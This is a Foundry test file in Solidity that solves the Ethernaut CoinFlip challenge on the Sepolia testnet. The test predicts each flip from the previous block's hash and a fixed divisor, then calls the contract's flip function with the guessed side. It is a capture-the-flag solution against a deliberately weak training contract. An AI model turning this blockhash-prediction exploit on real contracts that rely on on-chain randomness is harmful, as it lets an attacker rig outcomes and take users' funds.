// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/Ethernaut Challenge/03_CoinFlip.sol";

contract ContractTest03 is Test {
 
    CoinFlip level3 = CoinFlip(payable(0x81FC7c338467743CE79A85EFe10bDc9A41a8753A));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("https://rpc.ankr.com/eth_sepolia"));
    }

    function testExploit3() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        level3.flip(side);
        level3.consecutiveWins();
    }
    
    receive() external payable {}
}